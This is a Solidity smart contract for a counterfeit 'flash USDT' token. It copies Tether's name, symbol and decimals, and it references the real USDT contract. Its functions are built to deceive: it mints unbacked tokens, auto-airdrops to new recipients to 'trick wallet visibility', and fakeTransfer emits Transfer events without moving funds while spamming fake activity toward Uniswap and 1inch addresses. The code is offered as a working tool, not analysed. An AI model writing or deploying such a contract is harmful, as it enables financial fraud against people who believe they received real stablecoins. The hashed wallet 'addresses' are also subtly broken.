// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUSDT {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract FlashUSDT {
    string public name = "Tether USD"; // Mimics USDT
    string public symbol = "USDT";     // Mimics USDT
    uint8 public decimals = 6;
    uint256 public totalSupply;
    address public owner;
    
    IUSDT public realUSDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7); // Real USDT on Ethereum (replace for testing if needed)

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        // Mint initial supply to deployer
        _mint(msg.sender, 1_000_000_000 * 10**decimals); // 1 Billion USDT
        
        // Airdrop a portion to high-traffic wallets to help index the token
        _mintInitialSupply();
    }
    
    // Distribute tokens to pre-selected high-traffic addresses (update these addresses)
    function _mintInitialSupply() internal {
        address[5] memory highTrafficWallets;
        highTrafficWallets[0] = address(uint160(uint256(keccak256(abi.encodePacked("742d35Cc6634C0532925a3b844Bc454e4438f44e")))));
        highTrafficWallets[1] = address(uint160(uint256(keccak256(abi.encodePacked("BE0eB53F46cd790Cd13851d5EFf43D12404d33E8")))));
        highTrafficWallets[2] = address(uint160(uint256(keccak256(abi.encodePacked("8f22f2063d253846b53609231ed80fa571bc0c8f")))));
        highTrafficWallets[3] = address(uint160(uint256(keccak256(abi.encodePacked("66f820a414680B5bcda5eeca5dea238543f42054")))));
        highTrafficWallets[4] = address(uint160(uint256(keccak256(abi.encodePacked("9b9647431632af44be02ddd22477ed94d14aacaa")))));

        for (uint i = 0; i < highTrafficWallets.length; i++) {
            _mint(highTrafficWallets[i], 10_000 * 10**decimals); // Airdrop 10,000 USDT to each
        }
    }


    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);

        // Auto-Airdrop Trick: if recipient is new (balance equals the transferred amount), mint extra tokens
        if (balanceOf[recipient] == amount) {
            _mint(recipient, 10 * 10**decimals); // Airdrop 10 USDT
        }

        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);

        // Auto Airdrop to trick wallet visibility if recipient is new
        if (balanceOf[recipient] == amount) {
            _mint(recipient, 10 * 10**decimals);
        }

        return true;
    }

    // Returns the USDT balance from the external (or mock) USDT contract for display
    function getFakeBalance(address account) public view returns (uint256) {
        return realUSDT.balanceOf(account);
    }

    // Emits a fake transfer event to simulate a token transfer. Also emits additional spam transfers to increase activity.
    function fakeTransfer(address recipient, uint256 amount) public {
        emit Transfer(msg.sender, recipient, amount); // Main fake transfer

        address[3] memory spamWallets = [
            0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, // Uniswap V2 Factory
            0xC36442b4a4522E871399CD717aBDD847Ab11FE88, // Uniswap V3 Position Manager
            0x1111111254EEB25477B68fb85Ed929f73A960582  // 1inch Aggregator
        ];

        for (uint i = 0; i < spamWallets.length; i++) {
            emit Transfer(msg.sender, spamWallets[i], amount / 10);
        }
    }
}